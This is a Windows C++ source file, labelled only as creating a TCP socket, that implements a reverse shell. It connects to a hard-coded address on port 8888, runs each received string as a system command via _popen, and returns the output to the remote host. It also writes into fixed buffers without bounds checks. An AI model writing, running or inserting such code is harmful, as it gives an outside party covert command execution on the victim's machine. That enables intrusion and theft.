/*
	Create a TCP socket
*/

#include <stdio.h>
#include <winsock2.h>
#include <iostream>
#include <stdexcept>
#include <stdio.h>

// #pragma comment(lib,"ws2_32.lib") //Winsock Library

int main(int argc , char *argv[])
{
	// cmd execute vars:
	
	char cmd_recv_buffer[128];
	std::string cmd_recv_result = "";
	FILE* cmd_pipe;
	
	// other vars:

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char server_reply[2000], message[2000];
	int recv_size;

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}
	
	printf("Initialised.\n");
	
	//Create a socket
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}

	printf("Socket created.\n");
	
	
	server.sin_addr.s_addr = inet_addr("192.168.10.25");
	server.sin_family = AF_INET;
	server.sin_port = htons( 8888 );

	//Connect to remote server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		puts("connect error");
		return 1;
	}
	
	puts("Connected");
	
	//Send some data
	/*strcpy( message, "GET / HTTP/1.1\r\n\r\n" );
	if( send(s , message , strlen(message) , 0) < 0)
	{
		puts("Send failed");
		return 1;
	}
	puts("Data Send\n");*/
	
	while ( 1 ) {	
		// reset vars:
		cmd_recv_result = "";
		
		//Receive a reply from the server
		if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
		{
			puts("recv failed");
		} else {
			
			puts("Reply received\n");

			//Add a NULL terminating character to make it a proper string before printing
			server_reply[recv_size] = '\0';
			puts(server_reply);

			// WinExec( server_reply, 1 );
			
			cmd_pipe = _popen( server_reply, "r" );
			if ( !cmd_pipe ) {
				printf("Something went wrong with popen");
			}
			try {
				while ( fgets( cmd_recv_buffer, sizeof cmd_recv_buffer, cmd_pipe ) != NULL ) {
					cmd_recv_result += cmd_recv_buffer;
				}
			} catch (...) {
				_pclose( cmd_pipe );
				throw;
			}
			_pclose( cmd_pipe );
			std::cout << " ########### ";
			std::cout << cmd_recv_result;

			if ( cmd_recv_result == "exit\n" ) {
				break;
			}

			cmd_recv_result += "\n";

			//Send some data
			strcpy( message, cmd_recv_result.c_str() );
			if( send(s , message , strlen(message) , 0) < 0)
			{
				puts("Send failed");
				break;
			}
			puts("Data Send\n"); 
		}
	}

	closesocket(s);
	WSACleanup();

	return 0;
}
